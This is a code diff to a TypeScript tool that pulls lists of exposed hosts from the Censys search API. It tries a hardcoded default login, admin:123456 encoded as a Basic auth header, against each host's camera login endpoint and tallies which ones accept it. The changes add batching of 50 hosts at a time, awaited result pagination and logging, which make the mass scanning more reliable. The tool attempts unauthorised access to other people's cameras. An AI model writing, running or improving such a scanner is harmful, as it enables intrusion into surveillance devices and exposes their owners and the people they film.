@@ -113,26 +113,31 @@ export class Generate {
 
 
   private async getCameraCount(server: string): Promise<number> {
-    const response = await this.timeoutFetch(10000, fetch(`http://${server}/Media/Device/getDevice?response_format=json`, {
-      headers: {
-        "Authorization": "Basic YWRtaW46MTIzNDU2"
-      }
-    }))
+    console.log("GETTING CAMERA COUNT ", server)
+    try {
+      const response = await this.timeoutFetch(10000, fetch(`http://${server}/Media/Device/getDevice?response_format=json`, {
+        headers: {
+          "Authorization": "Basic YWRtaW46MTIzNDU2"
+        }
+      }))
 
-    if (response.status == 200) {
-      try {
-        const text = await response.text();
-        const json = JSON.parse(text);
-        return json["DeviceConfig"]["Devices"]["Device"].length;
-      } catch {
-        return 0;
+      if (response.status == 200 && response.statusText == "OK") {
+        try {
+          const text = await response.text();
+          const json = JSON.parse(text);
+          return json["DeviceConfig"]["Devices"]["Device"].length;
+        } catch {
+          return 0;
+        }
       }
     }
+    catch { }
     return 0;
   }
 
 
   private async testServers(list: CameraRecord[]) {
+    console.log(`TESTING ${list.length} SERVERS`)
     let promises = list.map(item => this.timeoutFetch(10000, fetch(`http://${item.ip}:${item.port}/Media/UserGroup/login?response_format=json`, {
       headers: {
         "Authorization": "Basic YWRtaW46MTIzNDU2"
@@ -153,12 +158,8 @@ export class Generate {
           this.failedCount += 1;
       })
       .catch(() => { this.errorCount += 1; })
-
     )
-
-
-    const results = await Promise.all(promises);
-    return results;
+    return Promise.all(promises);
   }
 
 
@@ -180,6 +181,7 @@ export class Generate {
 
 
   private async searchCensys(key: string = "", cursor: string = "") {
+    console.log(`CURSOR: ${cursor}`)
     if (!key)
       key = Buffer.from(`${this.censysAppId}:${this.censysSecret}`).toString("base64");
 
@@ -218,16 +220,23 @@ export class Generate {
       })
     })
 
-    await this.testServers(Array.from(ipList))
+    const arrs = [];
+    const ipArr = Array.from(ipList);
+
+    while (ipArr.length > 0)
+      arrs.push(ipArr.splice(0, 50))
+
+    for (const arr of arrs) {
+      await this.testServers(arr)
+    }
 
     const nextCursor = json["result"]["links"]["next"]
     if (nextCursor)
-      this.searchCensys(key, nextCursor);
+      await this.searchCensys(key, nextCursor);
 
   }
 
   private async handleGenerateStart() {
-    console.log("HERE")
     if (this.active)
       return;
     this.successCount = 0;
@@ -239,7 +248,6 @@ export class Generate {
 
     console.log("loading censys results");
     await this.searchCensys()
-
 
     this.active = false;
 
